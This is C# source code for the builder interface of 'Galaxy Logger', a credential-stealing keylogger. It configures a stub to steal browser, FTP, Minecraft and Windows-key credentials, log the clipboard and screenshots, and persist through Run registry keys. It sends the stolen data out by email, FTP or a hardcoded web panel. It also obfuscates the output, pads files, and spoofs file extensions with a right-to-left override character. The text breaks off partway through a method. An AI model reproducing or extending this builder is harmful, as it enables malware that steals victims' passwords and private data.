using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using Mono.Cecil;
using System.Net.Mail;
using System.Net;
using System.Collections.Specialized;

namespace Galaxy_Logger
{
    public partial class Form1 : Form
    {
        private const string WEBPANEL = "http://galaxysproducts.com/testpanel";
        private static Random random = new Random();
        OpenFileDialog openFileDialog = new OpenFileDialog();
        private static string HWID = string.Empty;
        private License zLicense;
        public Form1(object a)
        {
           // zLicense = (License)a;
            InitializeComponent();
            SetupPasswordRecoveryListView();
            SetDoubleBuffered(lvPasswordRecovery);
            //setupAccountInfo();
            //loadNews();
            HWID = GenerateHWID();

        }
        public Form1()
        {
            InitializeComponent();
            SetupPasswordRecoveryListView();
            SetDoubleBuffered(lvPasswordRecovery);
            setupAccountInfo();
            loadNews();
            HWID = GenerateHWID();
            comboBoxDirectory.SelectedIndex = 0;
            comboBoxFileType.SelectedIndex = 0;
        }

        #region " HWID "
        private static string GenerateHWID()
        {
            try
            {
                Guid IntGuID = new Guid();
                uint IntSerialNum = 0;
                string str = "C:";
                string str1 = null;
                uint num = 0;
                uint num1 = 0;
                string str2 = null;
                GetVolumeInformationA(ref str, ref str1, 255, ref IntSerialNum, ref num, ref num1, ref str2, 255);
                HidD_GetHidGuid(ref IntGuID);
                string GenerateHwid = MD5(string.Concat(IntGuID.ToString(), IntSerialNum.ToString()));
                return GenerateHwid;
            }
            catch { } return string.Empty;
        }
        private static string MD5(string inputstr)
        {
            string Md5Hash;
            using (MD5CryptoServiceProvider md5object = new MD5CryptoServiceProvider())
            {
                byte[] BytesToHash = md5object.ComputeHash(Encoding.ASCII.GetBytes(inputstr));
                string Output = null;
                byte[] numArray = BytesToHash;
                for (int i = 0; i < checked((int)numArray.Length); i++)
                {
                    byte b = numArray[i];
                    Output = string.Concat(Output, b.ToString("X2"));
                }
                Md5Hash = Output.ToUpper();
            }
            return Md5Hash;
        }
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern bool GetVolumeInformationA(ref string lpRootPathName, ref string lpVolumeNameBuffer, uint nVolumeNameSize, ref uint lpVolumeSerialNumber, ref uint lpMaximumComponentLength, ref uint lpFileSystemFlags, ref string lpFileSystemNameBuffer, uint nFileSystemNameSize);

        [DllImport("hid", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern void HidD_GetHidGuid(ref Guid hidGuid);

        #endregion

        public static void SetDoubleBuffered(System.Windows.Forms.Control c)
        {
            //Taxes: Remote Desktop Connection and painting
            //http://blogs.msdn.com/oldnewthing/archive/2006/01/03/508694.aspx
            if (System.Windows.Forms.SystemInformation.TerminalServerSession)
                return;

            System.Reflection.PropertyInfo aProp =
                  typeof(System.Windows.Forms.Control).GetProperty(
                        "DoubleBuffered",
                        System.Reflection.BindingFlags.NonPublic |
                        System.Reflection.BindingFlags.Instance);

            aProp.SetValue(c, true, null);
        }

        public void SetupPasswordRecoveryListView()
        {
            Dictionary<string, string> lvItems = new Dictionary<string, string>();
            lvItems.Add("Internet Explorer", "Versions 4.0-11.0");
            lvItems.Add("Mozilla Firefox", "All Versions");
            lvItems.Add("Google Chrome", "All Versions");
            lvItems.Add("Opera", "All Versions");
            lvItems.Add("Safari", "All Versions");
            lvItems.Add("SeaMonkey", "All Versions");
            lvItems.Add("Minecraft", "As long as there is a lastlogin file");
            lvItems.Add("Windows Product Key", "Any version Galaxy Logger is compatible with");
            lvItems.Add("Filezilla", "All Versions");
            lvItems.Add("CoreFTP", "All Versions");
            lvPasswordRecovery.BeginUpdate();
            int index = 0;
            foreach (KeyValuePair<string, string> entry in lvItems)
            {
                lvPasswordRecovery.Items.Add(new ListViewItem(new string[] { entry.Key, entry.Value }, index));
                index++;
            }
            lvPasswordRecovery.EndUpdate();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (e.Node.Text.ToLower().Contains("settings"))
                return;
            foreach (Control c in Theme.Controls)
            {
                if (c.GetType() == typeof(Panel))
                {
                    if (((Panel)c).Name.ToString().ToLower().Contains(e.Node.Text.ToLower().Replace(" ", "")))
                    {
                        c.Visible = true;
                        //c.BringToFront();
                    }
                    else
                    {
                        //MessageBox.Show(((Panel)c).Name.ToString().ToLower(), e.Node.Text.ToLower().Replace(" ", ""), MessageBoxButtons.OKCancel, MessageBoxIcon.Asterisk);
                        c.Visible = false;
                        //c.SendToBack();
                    }
                }
            }
        }

        private void BuildFile(object args)
        {
           
            string savePath = args.ToString();
            Action test = () =>
            {
                lbBuildLog.Items.Clear();
                lbBuildLog.Items.Add("> Starting build...");
                lbBuildLog.Items.Add("> Reading settings...");
            };
            lbBuildLog.Invoke(test);
            
            //
            //
           
            string mutex = tbMutex.AmbianceTB.Text;
            if (string.IsNullOrEmpty(mutex))
                mutex = Guid.NewGuid().ToString();
            try
            {
                AssemblyDefinition a = AssemblyDefinition.ReadAssembly(Application.StartupPath + "\\stub.bin");
                //MonoHelper.ReplaceString("[PAYLOAD]", payLoad, a);
                MonoHelper.ReplaceString("[MUTEX]", mutex, a);
                MonoHelper.ReplaceString("[HWID]", HWID, a);
                MonoHelper.ReplaceString("[LOGINTERVAL]", nudLogInterval.Value.ToString(), a);

              

                MonoHelper.ReplaceString("[REGISTRYPATH]", StringCipher.Encrypt(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", mutex), a);
                MonoHelper.ReplaceString("[ZONEID]", StringCipher.Encrypt(":Zone.Identifier", mutex), a);
                MonoHelper.ReplaceString("[REGISTRYCOREFTP]", StringCipher.Encrypt(@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\", mutex), a);
                MonoHelper.ReplaceString("[SITEMANAGER]", StringCipher.Encrypt("sitemanager.xml", mutex), a);
                MonoHelper.ReplaceString("[RECENTSERVERS]", StringCipher.Encrypt("recentservers.xml", mutex), a);
                MonoHelper.ReplaceString("[CHROMEPATH]", StringCipher.Encrypt(@"\Google\Chrome\User Data\Default\", mutex), a);

                //MonoHelper.ReplaceString("[CreateProcessW]", StringCipher.Encrypt("CreateProcessW", mutex), a);
                MonoHelper.ReplaceString("[GetThreadContext]", StringCipher.Encrypt("GetThreadContext", mutex), a);
                MonoHelper.ReplaceString("[NtUnmapViewOfSection]", StringCipher.Encrypt("NtUnmapViewOfSection", mutex), a);
                MonoHelper.ReplaceString("[ReadProcessMemory]", StringCipher.Encrypt("ReadProcessMemory", mutex), a);
                MonoHelper.ReplaceString("[ResumeThread]", StringCipher.Encrypt("ResumeThread", mutex), a);
                MonoHelper.ReplaceString("[SetThreadContext]", StringCipher.Encrypt("SetThreadContext", mutex), a);
                MonoHelper.ReplaceString("[VirtualAllocEx]", StringCipher.Encrypt("VirtualAllocEx", mutex), a);
                MonoHelper.ReplaceString("[Wow64GetThreadContext]", StringCipher.Encrypt("Wow64GetThreadContext", mutex), a);
                MonoHelper.ReplaceString("[Wow64SetThreadContext]", StringCipher.Encrypt("Wow64SetThreadContext", mutex), a);
                MonoHelper.ReplaceString("[WriteProcessMemory]", StringCipher.Encrypt("WriteProcessMemory", mutex), a);




                //Always things here


                //Now settings

                if (rbEmail.Checked)
                {
                    MonoHelper.ReplaceString("[UPLOADMETHOD]", "EMAIL", a);
                }
                else if (rbFTP.Checked)
                {
                    MonoHelper.ReplaceString("[UPLOADMETHOD]", "FTP", a);
                }
                else if (rbPanel.Checked)
                {
                    MonoHelper.ReplaceString("[UPLOADMETHOD]", "PHP", a);
                }


                MonoHelper.ReplaceString("[EMAILUSERNAME]", StringCipher.Encrypt(tbEmailUsername.AmbianceTB.Text, mutex), a);
                MonoHelper.ReplaceString("[EMAILPASSWORD]", StringCipher.Encrypt(tbEmailPassword.AmbianceTB.Text, mutex), a);
                MonoHelper.ReplaceString("[EMAILPORT]", StringCipher.Encrypt(tbEmailPort.AmbianceTB.Text, mutex), a);
                if (cbSSL.Checked)
                    MonoHelper.ReplaceString("[EMAILSSL]", Guid.NewGuid().ToString(), a);
                else
                    MonoHelper.ReplaceString("[EMAILSSL]", string.Empty, a);
                MonoHelper.ReplaceString("[EMAILSERVER]", StringCipher.Encrypt(tbEmailServer.AmbianceTB.Text, mutex), a);
                MonoHelper.ReplaceString("[FTPUSERNAME]", StringCipher.Encrypt(tbFTPUsername.AmbianceTB.Text, mutex), a);
                MonoHelper.ReplaceString("[FTPPASSWORD]", StringCipher.Encrypt(tbFTPPassword.AmbianceTB.Text, mutex), a);
                MonoHelper.ReplaceString("[FTPSERVER]", StringCipher.Encrypt(tbFTPServer.AmbianceTB.Text, mutex), a);
                MonoHelper.ReplaceString("[WEBPANELKEY]", StringCipher.Encrypt(tbWebPanelUploadKey.AmbianceTB.Text, mutex), a);
                MonoHelper.ReplaceString("[WEBPANEL]", StringCipher.Encrypt(WEBPANEL, mutex), a);
               
                //Install Tab
                if (cbInstallation.Toggled)
                {
                    String tVAr = "";
                    Invoke(new MethodInvoker(() => tVAr = (comboBoxDirectory.SelectedIndex + 1).ToString()));

                    //Invoke(new Action( tVAr = (comboBoxDirectory.SelectedIndex + 1).ToString()));

                    MonoHelper.ReplaceString("[INSTALLFILE]", Guid.NewGuid().ToString(), a);
                    MonoHelper.ReplaceString("[PATHTYPE]", tVAr, a);
                    MonoHelper.ReplaceString("[FOLDER]", tbSubfolder.AmbianceTB.Text, a);
                    MonoHelper.ReplaceString("[FILENAME]", tbProcess.AmbianceTB.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[INSTALLFILE]", string.Empty, a);
                }

                if (cbHKCU.Checked)
                {
                    MonoHelper.ReplaceString("[HKCU]", tbHKCU.AmbianceTB.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[HKCU]", string.Empty, a);
                }

                if (cbHKLM.Checked)
                {
                    MonoHelper.ReplaceString("[HKLM]", tbHKLM.AmbianceTB.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[HKLM]", string.Empty, a);
                }

                if (cbStartupPersistence.Checked)
                {
                    MonoHelper.ReplaceString("[REGPERSISTENCE]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[REGPERSISTENCE]", string.Empty, a);
                }

                if (cbHideFile.Checked)
                {
                    MonoHelper.ReplaceString("[HIDEFILE]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[HIDEFILE]", string.Empty, a);
                }
                //
                //General Tab
                if (cbClipboardLogger.Checked)
                {
                    MonoHelper.ReplaceString("[CLIPBOARD]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[CLIPBOARD]", string.Empty, a);
                }

                if (cbModifyTaskManager.Checked)
                {
                    MonoHelper.ReplaceString("[MODIFYTASK]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[MODIFYTASK]", string.Empty, a);
                }

                if (cbMeltFile.Checked)
                {
                    MonoHelper.ReplaceString("[MELTFILE]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[MELTFILE]", string.Empty, a);
                }

                if (cbCaptureScreenshots.Checked)
                {
                    MonoHelper.ReplaceString("[SCREENSHOTS]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[SCREENSHOTS]", string.Empty, a);
                }

                if (cbAntiEmulation.Checked)
                {
                    MonoHelper.ReplaceString("[ANTIEMULATION]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[ANTIEMULATION]", string.Empty, a);
                }

                if (cbProcessProtection.Checked)
                {
                    MonoHelper.ReplaceString("[PROCESSPROTECTION]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[PROCESSPROTECTION]", string.Empty, a);
                }

                if (cbRuneScapePinlogger.Checked)
                {
                    MonoHelper.ReplaceString("[PINLOGGER]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[PINLOGGER]", string.Empty, a);
                }

                if (cbClearSavedPasswords.Checked)
                {
                    MonoHelper.ReplaceString("[CLEARSAVED]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[CLEARSAVED]", string.Empty, a);
                }
                //
                //Miscellaneous Tab
                if (cbFileDownloader.Checked)
                {
                    String tvar = "";
                    Invoke(new MethodInvoker(() => tvar = comboBoxFileType.Text));
                    MonoHelper.ReplaceString("[DOWNLOADURL]", tbFileDownloader.AmbianceTB.Text, a);
                    MonoHelper.ReplaceString("[TYPE]", tvar, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[DOWNLOADURL]", string.Empty, a);
                    MonoHelper.ReplaceString("[TYPE]", string.Empty, a);
                }

                if (cbMessageBox.Checked)
                {
                    String tvar = "";
                    Invoke(new MethodInvoker(()=> tvar = comboBoxMessageBoxType.Text));
                    MonoHelper.ReplaceString("[MTYPE]", tvar, a);
                    MonoHelper.ReplaceString("[MTITLE]", tbMessageBoxTitle.AmbianceTB.Text, a);
                    MonoHelper.ReplaceString("[MBODY]", tbMessageBoxBody.AmbianceTB.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[MTYPE]", string.Empty, a);
                }

                if (cbDelayExecution.Checked)
                {
                    MonoHelper.ReplaceString("[DELAY]", nudDelayExecution.Value.ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[DELAY]", "0", a);
                }

                if (cbPasswordRecovery.Toggled)
                {
                    MonoHelper.ReplaceString("[STEALER]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[STEALER]", string.Empty, a);
                }
                Action doneSettings = () =>
                {
                    lbBuildLog.Items.Add("> Settings done...");
                };
                lbBuildLog.Invoke(doneSettings);


                a.Write(savePath);
                if (cbChangeIcon.Checked && !string.IsNullOrEmpty(tbIconPath.AmbianceTB.Text))
                    IconInjector.InjectIcon(savePath, tbIconPath.AmbianceTB.Text);
                lbBuildLog.Invoke((MethodInvoker)delegate { lbBuildLog.Items.Add("> Obfuscating file..."); });
                Process.Start(Application.StartupPath + "\\Obfuscator\\Obfuscator.exe", string.Format("\"{0}\" {1}", savePath, "3"));
                Thread.Sleep(3000);
                //ObfuscateCode(savePath);
                while (!File.Exists(savePath + "-Renamed.exe"))
                    Thread.Sleep(500);
                File.Delete(savePath);
                File.Move(savePath + "-Renamed.exe", savePath);
                if (cbChangeAssembly.Checked)
                {
                    //string changeAsmArgs = string.Format("{0} {1} /va /s title {2} /s desc {3} /s company {4} /s product {5} /s copyright {6}", savePath, tbVersion.Text, tbTitle.Text, tbDescription.Text, tbCompany.Text, tbProduct.Text, tbCopyright.Text);
                    //Process.Start(Application.StartupPath + "\\verpatch.exe", changeAsmArgs);
                }
                lbBuildLog.Invoke((MethodInvoker)delegate { lbBuildLog.Items.Add("> File saved @ " + savePath); });

                MessageBox.Show("Galaxy Logger Built!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "Failure", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }




            //tbBuildLog.Text += "";

        }

        private void setupAccountInfo()
        {
            if (zLicense != null) { 
            usernameText.Text = zLicense.Username;
            onlineUsersText.Text = zLicense.UsersOnline.ToString();
            versionText.Text = zLicense.ProductVersion.ToString();
            lastUpdateText.Text = zLicense.GetVariable("lastupdate");
            GUIDText.Text = zLicense.GUID;
            ipAddressText.Text = zLicense.IPAddress.ToString();
            }
            else
            {
                usernameText.Text = "";
                onlineUsersText.Text = "";
                versionText.Text = "";
                lastUpdateText.Text = "";
                GUIDText.Text = "";
                ipAddressText.Text = "";
            }

        }

        private void panelNews_Paint(object sender, PaintEventArgs e)
        {
            Control[] newsControls = new Control[2];
            Label labelNews = new Label();
            labelNews.AutoSize = true;
            labelNews.Location = new System.Drawing.Point(3, 14);
            labelNews.Name = "labelNews";
            labelNews.Size = new System.Drawing.Size(37, 16);
            labelNews.TabIndex = 1;
            labelNews.Text = "News";
            newsControls[0] = labelNews;
            NSTextBox newsTextBox = new NSTextBox();
            newsTextBox.BackColor = System.Drawing.Color.FromArgb(36, 40, 42);
            newsTextBox.ForeColor = System.Drawing.Color.FromArgb(142, 152, 156);
            newsTextBox.Location = new System.Drawing.Point(3, 33);
            //newsTextBox.MaxCharacters = 32767;
            newsTextBox.Name = "newsTextBox";
            newsTextBox.Size = new System.Drawing.Size(337, 270);
            newsTextBox.TabIndex = 0;
            //newsTextBox.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            newsTextBox.Text = "Test";
            newsControls[1] = newsTextBox;
            //this.updatePanel(ref newsControls);
        }

        private void nsControlButton1_Click(object sender, EventArgs e)
        {
        }

        private void filePumperButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executables | *.exe";
            openFileDialog.Title = "Select an executable which should be pumped";
            openFileDialog.CheckFileExists = true;
            Control[] pumpControls = new Control[5];
            Label labelPumpFilePath = new Label();
            labelPumpFilePath.AutoSize = true;
            labelPumpFilePath.Location = new System.Drawing.Point(17, 108);
            labelPumpFilePath.Name = "labelPumpFilePath";
            labelPumpFilePath.Size = new System.Drawing.Size(38, 16);
            labelPumpFilePath.TabIndex = 4;
            labelPumpFilePath.Text = "Path: ";
            pumpControls[0] = labelPumpFilePath;
            TextBox textBoxPumpSize = new TextBox();
            textBoxPumpSize.Location = new System.Drawing.Point(114, 133);
            textBoxPumpSize.Name = "textBoxPumpSize";
            textBoxPumpSize.Size = new System.Drawing.Size(100, 20);
            textBoxPumpSize.TabIndex = 3;
            pumpControls[1] = textBoxPumpSize;
            NSButton cmdDoPumpFile = new NSButton();
            cmdDoPumpFile.BackColor = System.Drawing.Color.FromArgb(38, 38, 38);
            cmdDoPumpFile.Font = new System.Drawing.Font("Trebuchet MS", 8.25F, System.Drawing.FontStyle.Bold);
            cmdDoPumpFile.ForeColor = System.Drawing.Color.White;
            cmdDoPumpFile.Location = new System.Drawing.Point(233, 133);
            cmdDoPumpFile.Name = "cmdDoPumpFile";
            cmdDoPumpFile.Size = new System.Drawing.Size(75, 20);
            cmdDoPumpFile.TabIndex = 2;
            cmdDoPumpFile.Text = "Pump File";
            //cmdDoPumpFile.TextAlignment = System.Drawing.StringAlignment.Center;
            cmdDoPumpFile.Click += (object sender1, EventArgs e1) =>
            {
                string sizestr = textBoxPumpSize.Text;
                int size = 0;
                if (!int.TryParse(sizestr, out size))
                {
                    MessageBox.Show("Please enter a valid numerical value for the size!", "Wrong input", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (File.Exists(openFileDialog.FileName))
                {
                    string newd = "";
                    for (int i = 0; i < size; i++)
                        newd += "A";
                    File.AppendAllText(openFileDialog.FileName, newd);
                }
                else
                    MessageBox.Show("File couldn' be opened!", "File is missing", MessageBoxButtons.OK, MessageBoxIcon.Error);
                MessageBox.Show("File succesfully pumped!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            };
            pumpControls[2] = cmdDoPumpFile;
            Label labelSize = new Label();
            labelSize.AutoSize = true;
            labelSize.Location = new System.Drawing.Point(17, 136);
            labelSize.Name = "labelSize";
            labelSize.Size = new System.Drawing.Size(91, 16);
            labelSize.TabIndex = 1;
            labelSize.Text = "Size (in bytes): ";
            pumpControls[3] = labelSize;
            NSButton cmdSelectFileToPump = new NSButton();
            cmdSelectFileToPump.BackColor = System.Drawing.Color.FromArgb(38, 38, 38);
            cmdSelectFileToPump.Font = new System.Drawing.Font("Trebuchet MS", 8.25F, System.Drawing.FontStyle.Bold);
            cmdSelectFileToPump.ForeColor = System.Drawing.Color.White;
            cmdSelectFileToPump.Location = new System.Drawing.Point(233, 108);
            cmdSelectFileToPump.Name = "cmdSelectFileToPump";
            cmdSelectFileToPump.Size = new System.Drawing.Size(75, 20);
            cmdSelectFileToPump.TabIndex = 0;
            cmdSelectFileToPump.Text = "Select File";
            //cmdSelectFileToPump.TextAlignment = System.Drawing.StringAlignment.Center;
            cmdSelectFileToPump.Click += (object sender2, EventArgs e2) =>
            {
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    labelPumpFilePath.Text = String.Format("Path: {0}", (openFileDialog.FileName.Length > 29) ? openFileDialog.FileName.Substring(0, 26) + "..." : openFileDialog.FileName);
                }
                else
                    MessageBox.Show("You've to select a file in order to pump it", "No file selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            };
            pumpControls[4] = cmdSelectFileToPump;
        }

        private void cmdSelectFileToPump_Click(object sender, EventArgs e)
        {
            //OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executables | *.exe";
            openFileDialog.Title = "Select an executable which should be pumped";
            openFileDialog.CheckFileExists = true;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                labelPumpFilePath.Text = String.Format("Path: {0}", (openFileDialog.FileName.Length > 29) ? openFileDialog.FileName.Substring(0, 26) + "..." : openFileDialog.FileName);
            }
            else
                MessageBox.Show("You've to select a file in order to pump it", "No file selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);

        }

        private void cmdDoPumpFile_Click(object sender, EventArgs e)
        {
            string sizestr = textBoxPumpSize.Text;
            int size = 0;
            if (!int.TryParse(sizestr, out size))
            {
                MessageBox.Show("Please enter a valid numerical value for the size!", "Wrong input", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (File.Exists(openFileDialog.FileName))
            {
                string newd = "";
                for (int i = 0; i < size; i++)
                    newd += "A";
                File.AppendAllText(openFileDialog.FileName, newd);
                MessageBox.Show("File succesfully pumped!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
                MessageBox.Show("File couldn' be opened!", "File is missing", MessageBoxButtons.OK, MessageBoxIcon.Error);


        }

        private void cmdDoSpoofExt_Click(object sender, EventArgs e)
        {
            string extstr = textBoxSpoofExt.Text;
            if (extstr == "")
            {
                MessageBox.Show("Please enter a valid value for the extension!", "Wrong input", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (File.Exists(openFileDialog.FileName))
            {
                string Filename = openFileDialog.FileName;
                int i = checked(Filename.Length - 4);
                char ch = '\x202E';
                char[] chArr = extstr.ToCharArray();
                Array.Reverse(chArr);
                string s = Filename.Substring(0, i) + ch.ToString() + (new String(chArr)) + Filename.Substring(i);
                File.Copy(Filename, s);
            }
            else
                MessageBox.Show("File couldn' be opened!", "File is missing", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("File succesfully spoofed!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);

        }

        private void nsButton2_Click(object sender, EventArgs e)
        {
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                labelSpoofFilePath.Text = String.Format("Path: {0}", (openFileDialog.FileName.Length > 29) ? openFileDialog.FileName.Substring(0, 26) + "..." : openFileDialog.FileName);
            }
            else
                MessageBox.Show("You've to select a file in order to spoof it", "No file selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);

        }

        private void btnRemoveKeylogger_Click(object sender, EventArgs e)
        {
            lbVaccineLog.Items.Clear();
            string notifyFile = Path.GetTempPath() + HWID + ".dat";
            if (!File.Exists(notifyFile))
                lbVaccineLog.Items.Add("> No Galaxy Loggers found!");
            else
            {
                string[] file = File.ReadAllLines(notifyFile);
                string infectedPath = file[1];
                if (File.Exists(infectedPath))
                {
                    lbVaccineLog.Items.Add("> Galaxy Logger found @ " + infectedPath);
                    lbVaccineLog.Items.Add("> Attempting to remove...");
                    Process[] processList = Process.GetProcesses();
                    string fileName = Path.GetFileNameWithoutExtension(infectedPath);
                    foreach (Process p in processList)
                    {
                        if (p.ProcessName.Equals(fileName))
                        {
                            try
                            {
                                p.Kill();
                                lbVaccineLog.Items.Add("> Killed (possible virus) process with PID: " + p.Id);
                            }
                            catch { lbVaccineLog.Items.Add("> Could not kill (possible virus) process with PID: " + p.Id); }
                        }
                    }
                    try
                    {
                        Thread.Sleep(500);
                        lbVaccineLog.Items.Add("> Deleting file @ : " + infectedPath);
                        File.Delete(infectedPath);
                        lbVaccineLog.Items.Add("> File deleted.");
                    }
                    catch { lbVaccineLog.Items.Add("> Could not delete file"); }
                    lbVaccineLog.Items.Add("> Scanning registry...");
                    foreach (var name in Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValueNames())
                    {
                        var value = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(name);
                        if (infectedPath.Equals(value))
                        {
                            Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(name);
                            lbVaccineLog.Items.Add("> Removed an registry HKCU key: " + name);
                        }

                    }
                    foreach (var name in Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValueNames())
                    {
                        var value = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(name);
                        if (infectedPath.Equals(value))
                        {
                            Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(name);
                            lbVaccineLog.Items.Add("> Removed an HKLM registry key: " + name);
                        }

                    }
                    File.Delete(notifyFile);
                    lbVaccineLog.Items.Add("> Removed infection file");
                    lbVaccineLog.Items.Add("> System is clean.");
                }
            }
        }

        private void panelAccountInfo_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void randomPool_ValueChanged_1(object sender)
        {
            tbMutex.Text = randomPool.Value;
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.InitialDirectory = Application.StartupPath;
                ofd.Filter = ".ico|*.ico";
                ofd.ShowDialog();
                if (!string.IsNullOrEmpty(ofd.FileName))
                {
                    tbIconPath.Text = ofd.FileName;
                    pbIcon.ImageLocation = ofd.FileName;
                }
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (!DeliverySettingsFilled())
            {
                MessageBox.Show("Delivery settings not completed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.InitialDirectory = Application.StartupPath;
                sfd.FileName = "*.exe";
                sfd.DefaultExt = ".exe|*.exe";
                sfd.Filter = "Executable Files .exe|*.exe";
                //if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK && X())
                if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
     
                    Thread tr = new Thread(BuildFile);
                    tr.SetApartmentState(ApartmentState.MTA);
                    tr.Start(sfd.FileName);
                    //new Thread(new ParameterizedThreadStart(BuildFile)).Start(sfd.FileName);
                }
            }
        }

        private void btnTestDelivery_Click(object sender, EventArgs e)
        {
            try
            {
                if (!DeliverySettingsFilled())
                {
                    MessageBox.Show("Delivery settings not completed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (rbEmail.Checked)
                {
                    MailMessage mail = new MailMessage();
                    SmtpClient SmtpServer = new SmtpClient(tbEmailServer.AmbianceTB.Text);
                    mail.From = new MailAddress(tbEmailUsername.AmbianceTB.Text);
                    mail.To.Add(tbEmailUsername.AmbianceTB.Text);
                    mail.Subject = "Galaxy Logger - Test E-Mail";
                    mail.Body = "Test E-Mail!";
                    SmtpServer.Port = Convert.ToInt32(tbEmailPort.AmbianceTB.Text);
                    SmtpServer.Credentials = new System.Net.NetworkCredential(tbEmailUsername.AmbianceTB.Text, tbEmailPassword.AmbianceTB.Text);
                    SmtpServer.EnableSsl = cbSSL.Checked;
                    SmtpServer.Send(mail);
                    MessageBox.Show("Test message sent!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else if (rbFTP.Checked)
                {
                    byte[] bytes = System.Text.ASCIIEncoding.ASCII.GetBytes(("Test FTP Upload!"));
                    String ftp = tbFTPServer.AmbianceTB.Text;
                    if (!(ftp.Substring(0, "ftp://".Length)).ToLower().Equals("ftp://"))
                    {
                        ftp = "ftp://" + ftp;
                    }
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftp + "/Galaxy Logger_TestUpload.txt");
                    request.Method = WebRequestMethods.Ftp.UploadFile;
                    request.Credentials = new NetworkCredential(tbFTPUsername.AmbianceTB.Text, tbFTPPassword.AmbianceTB.Text);
                    request.ContentLength = bytes.Length;
                    Stream requestStream = request.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                    Console.WriteLine("Upload File Complete, status {0}", response.StatusDescription);
                    MessageBox.Show("Test message sent!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else if (rbPanel.Checked)
                {
                    using (WebClient client = new WebClient())
                    {
                        //MessageBox.Show("Not available until panel is updated, this update is pretty big and will take a few days to roll-out completely.", "Sorry", MessageBoxButtons.OK, MessageBoxIcon.Information);

                        
                        byte[] response = client.UploadValues(WEBPANEL + "/insert", new NameValueCollection()
                        {
                            { "key", tbWebPanelUploadKey.AmbianceTB.Text },
                            { "type", "1" },
                            { "pcname", "TEST LOG UPLOAD" },
                            { "log", "Log upload completed."},
                            { "hwid", HWID }
                        });
                        string result = System.Text.Encoding.UTF8.GetString(response);
                        if (result.Equals("ok"))
                            MessageBox.Show("Log uploaded successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        else
